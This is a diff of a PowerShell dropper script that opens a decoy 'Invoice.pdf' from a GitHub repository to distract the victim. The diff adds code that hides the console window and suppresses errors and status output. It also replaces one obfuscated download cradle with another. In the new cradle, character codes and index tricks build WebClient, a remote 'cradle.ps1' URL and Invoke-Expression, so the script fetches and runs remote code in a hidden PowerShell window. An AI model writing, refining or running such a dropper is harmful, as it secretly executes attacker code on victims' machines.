@@ -1,4 +1,12 @@
-$pdfUrl = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'
+[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
+
+$pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
 $pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"
 
 $browserPaths = @(
@@ -19,20 +27,18 @@ $browserProcessNames = @(
     "firefox"
 )
 
-Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath
+Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -ErrorAction SilentlyContinue
 
 $browser = $browserPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
 
-if (-not $browser) {
-    Write-Warning "No supported browser found. Opening with system default."
-    Start-Process $pdfPath -WindowStyle Minimized
+if ($browser) {
+    Start-Process -FilePath $browser -ArgumentList "`"$pdfPath`"" -ErrorAction SilentlyContinue
 } else {
-    Write-Host "Opening with: $browser"
-    Start-Process -FilePath $browser -ArgumentList "`"$pdfPath`"" -WindowStyle Minimized
+    Start-Process $pdfPath -ErrorAction SilentlyContinue
 }
 
 function Get-PDFRenderer {
-    $procs = Get-CimInstance Win32_Process
+    $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
     $procs | Where-Object {
         $name = $_.Name -replace "\.exe$", ""
         ($browserProcessNames -contains $name) -and
@@ -48,4 +54,5 @@ do {
 } while ($pdfProcesses)
 
 powershell -NoP -sta -NonI -W Hidden -enc
-$mZXxKQwoX9kiW = & (("kr8Hol5eMX1NL7WTGpUjQt6czZFmui9gvVCYbEODfwxB-RJAdasq4P2Ih30SnKy")[11,7,41,44,38,36,19,7,23,21] -join '') ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,87,101,98,67,108,105,101,110,116) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_}); $UdXhVf = ([string]::join('', ( (104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,66,114,111,116,104,101,114,115,101,120,116,114,101,109,101,103,97,109,105,110,103,47,112,119,115,104,99,114,97,100,108,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,99,114,97,100,108,101,46,112,115,49) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_}); $mZXxKQwoX9kiW.DownloadString($UdXhVf) |%{$_}|ForEach-Object{$_}| & ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_})
+$t9bR6wBF0T2 = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_}) $([char](16+83-16)+[char](68+121-68)+[char](105*115/105)+[char](0+116-0)+[char](35+101-35)+[char](107*109/107)+[char](10+46-10)+[char](0+78-0)+[char](117*101/117)+[char](56+116-56)+[char](105+46-105)+[char](107*87/107)+[char](87*101/87)+[char](17+98-17)+[char](0+67-0)+[char](43*108/43)+[char](97+105-97)+[char](0+101-0)+[char](0+110-0)+[char](110+116-110)); $KtOjvuzeGpDZo1dYMh9y = ([string]::join('', ( (104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,66,114,111,116,104,101,114,115,101,120,116,114,101,109,101,103,97,109,105,110,103,47,112,119,115,104,99,114,97,100,108,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,99,114,97,100,108,101,46,112,115,49) |<##>ForEach-Object{$_}<##>|%{ ( [char][int] $_)})) |<##>ForEach-Object{$_}<##>| % {$_}); $t9bR6wBF0T2.DownloadString($KtOjvuzeGpDZo1dYMh9y) |<##>ForEach-Object{$_}<##>| & (("-83zmRSlMQucnVxLUIXsPFo29gqKk05B1dETahHJAtG6OeyYWfiwbDZ7v4jrNpC")[17,12,56,22,28,45,0,34,14,61,59,45,19,19,50,22,12] -join '')
+
